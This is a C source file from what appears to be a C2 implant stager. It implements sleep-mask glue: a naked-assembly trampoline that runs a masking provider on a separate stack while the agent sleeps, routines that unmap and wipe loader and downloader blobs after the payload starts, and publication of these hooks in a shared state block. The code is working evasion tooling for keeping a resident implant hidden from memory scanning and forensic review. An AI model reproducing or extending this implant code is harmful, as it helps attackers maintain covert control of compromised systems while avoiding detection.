/* mask.c — the sleep-mask provider contract glue.
 *
 * A provider is selected at build time with MASK=<name> and implements
 * stager_mask_provider_sleep() in mask_<name>.c. The stub publishes the
 * wrapper below in the same-process GS state block the agent reads; adding a
 * provider requires no change to the stub or agent.
 */

#include "mask.h"

#include "state.h"
#include "util/utils.h"

/*
 * Switch to the stager's dedicated stack while the provider runs. The agent's
 * stack is part of the masked set, so the trampoline's own frame must live on
 * the stub stack. Only %rbp needs saving: entry rsp is 8 mod 16, one push
 * restores the 16-byte alignment required before `call`.
 */
__attribute__((naked, used, visibility("default"))) int
stager_mask_run_on_stack(unsigned seconds, uintptr_t probe, void *stack_top,
                         uintptr_t keep_start, uintptr_t keep_end) {
  __asm__ __volatile__("pushq %rbp\n"
                       "movq %rsp, %rbp\n"
                       "movq %rdx, %rax\n" /* stack_top */
                       "movq %rcx, %rdx\n" /* keep_start -> arg 3 */
                       "movq %r8, %rcx\n"  /* keep_end -> arg 4 */
                       "movq %rax, %rsp\n"
                       "call stager_mask_provider_sleep\n"
                       "movq %rbp, %rsp\n"
                       "popq %rbp\n"
                       "ret\n");
}

/* Everything the loader needed to get the agent running can go: the malasada
 * blob is unmapped, its ciphertext and key were wiped during acquisition, and
 * the downloader blob was zeroed and unmapped before the payload ran. The
 * resident stager image is the mask stub; its loader entry points are no
 * longer reachable. */
static void drop_loader_blobs(void) {
  struct stager_state *st = get_stager_state();
  if (st->payload != NULL && st->payload_size > 0) {
    munmap(st->payload, PAGE_ALIGN_UP(st->payload_size));
    st->payload = NULL;
    st->payload_size = 0;
  }
}

/* Called once from c2_stager_mask_bind() as soon as the agent owns the
 * process, so the loader does not survive until the first sleep. */
static int stager_mask_ready(void) {
  drop_loader_blobs();
  return 0;
}

int stager_mask_sleep(unsigned seconds) {
  struct stager_state *st = get_stager_state();
  uint32_t flags = st->pub.report.flags;
  uintptr_t probe =
      (flags & C2_STAGER_MASK_STACK_VALID) ? st->pub.report.stack_sp : 0;

  /* Retry the loader cleanup in case an agent reported READY without calling
   * ready_fn (for example a provider that binds its own mask entry point). */
  if (flags & C2_STAGER_MASK_READY)
    drop_loader_blobs();
  if (st->mask_stack_top == NULL || st->state_map_len == 0)
    return -1;
  uintptr_t keep_start = (uintptr_t)st;
  uintptr_t keep_end = keep_start + st->state_map_len;
  return stager_mask_run_on_stack(seconds, probe, st->mask_stack_top,
                                  keep_start, keep_end);
}

void stager_mask_publish(void) {
  struct stager_state *st = get_stager_state();
  st->pub.abi_magic = C2_STAGER_ABI_MAGIC;
  st->pub.abi_version = C2_STAGER_ABI_VERSION;
  st->pub.mask_fn = stager_mask_sleep;
  st->pub.ready_fn = stager_mask_ready;
  st->pub.report.stack_sp = 0;
  st->pub.report.flags = 0;
  st->pub.report.reserved = 0;
}
